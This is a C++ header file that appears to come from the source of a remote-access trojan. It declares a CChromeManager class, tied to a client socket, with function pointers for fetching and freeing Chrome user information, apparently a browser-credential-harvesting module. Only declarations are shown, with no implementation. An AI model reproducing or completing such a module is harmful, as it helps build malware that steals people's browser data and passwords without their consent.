#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "../Manager.h"

class CChromeManager  : public CManager  
{
public:
	CChromeManager(CClientSocket *pClient);
	virtual ~CChromeManager();
public:
	//virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
protected:
	typedef int (*PfnGetChromeUserInfo)(char *&pOutData, int &iOutLen);
	typedef void (*PfnDeleteChromeUserInfo)(char *&pOutData);

	PfnGetChromeUserInfo fnGetChromeUserInfo;
	PfnDeleteChromeUserInfo fnDeleteChromeUserInfo;

};